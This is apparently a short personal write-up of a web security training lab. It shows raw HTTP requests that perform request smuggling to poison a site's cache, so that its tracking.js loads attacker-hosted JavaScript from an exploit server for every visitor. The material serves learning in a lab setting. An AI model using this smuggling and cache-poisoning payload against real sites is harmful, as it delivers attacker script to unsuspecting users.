@@ -1,0 +1,36 @@
+Lab: Exploiting HTTP request smuggling to perform web cache poisoning
+
+
+'''
+POST / HTTP/1.1
+Host: 0aff009d035317ac8085d08900ad007c.web-security-academy.net
+Cookie: session=lFDcwhkGRfXZT7fePiOypb6Zf9ep9LiG; fingerprint=k3Sb4LBhk68HLXg4dQ0iJEhOVMmNfx6W; secret=tpL5bhjAdkkn5Q1XvHjZEt1DXfnFrm4q
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: https://0aff009d035317ac8085d08900ad007c.web-security-academy.net/post?postId=1
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Content-Length: 190
+Connection: keep-alive
+
+0
+
+GET /post/next?postId=3 HTTP/1.1
+Host: exploit-0a0b0040035d174980dccf3301b800c3.exploit-server.net/malicious
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=1
+'''
+this should give a 302 to the exploit server
+
+
+
+then send:
+'''
+GET /resources/js/tracking.js HTTP/2
+Host: 0aff009d035317ac8085d08900ad007c.web-security-academy.net
+Cookie: session=0rgkeeCC76zxT0UiT2RXQBvVY98DVUTz
+'''
+
+this /resources/js/tracking.js is used in the website after every request made by the user but is on our server and executes the javascript, solving the lab
